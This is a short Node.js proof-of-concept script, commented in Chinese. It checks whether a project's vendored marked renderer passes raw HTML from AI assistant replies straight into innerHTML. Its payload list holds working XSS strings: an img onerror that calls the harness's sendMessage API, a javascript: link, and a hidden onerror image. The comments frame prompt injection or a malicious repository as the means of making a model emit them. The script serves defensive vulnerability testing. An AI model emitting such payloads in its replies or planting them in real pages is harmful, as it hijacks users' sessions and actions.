/**
 * PoC: harness.html renderMarkdown → marked.parse 无消毒 → innerHTML
 * 复现 src/ui/harness.html:2572 的调用方式：marked.parse(src, { gfm: true, breaks: true })
 * 输入 = AI 助手回复文本（不可信：prompt injection / 恶意仓库诱导模型输出）。
 * 目的：确认 vendor marked v18.0.14 是否原样放行原始 HTML（如 <img onerror>）。
 * 用 vm 把 UMD 当作浏览器分支执行（g["marked"]=f()），与 harness.html 的 window.marked 等价。
 */
const fs = require('fs');
const vm = require('vm');

const code = fs.readFileSync('D:/Desktop/Super-File/cuckoo-code/src/ui/vendor/marked.umd.js', 'utf8');
const sandbox = { self: {}, window: undefined, define: undefined };
vm.createContext(sandbox);
vm.runInContext(code, sandbox);
const marked = sandbox.marked || sandbox.self.marked;
if (!marked || typeof marked.parse !== 'function') {
  console.error('FAIL: marked 未挂载到 self.marked');
  process.exit(1);
}
console.log('marked loaded, version:', marked.defaults && marked.defaults.version || '(n/a)');

const payloads = [
  '<img src=x onerror="window.harnessAPI.sendMessage(\'pwned\')">',
  '[click](javascript:window.harnessAPI.sendMessage(\'pwned\'))',
  '好的，已完成。\n\n<div style="display:none"><img src=x onerror="alert(1)"></div>',
];

for (const p of payloads) {
  const out = marked.parse(p, { gfm: true, breaks: true });
  console.log('--- input ---');
  console.log(p);
  console.log('--- output (会被赋给 innerHTML) ---');
  console.log(out);
  console.log('=> 含原始 <img onerror>:', /<img[^>]*onerror=/i.test(out));
  console.log('=> 含 javascript: 链接:', /href="javascript:/i.test(out));
  console.log();
}
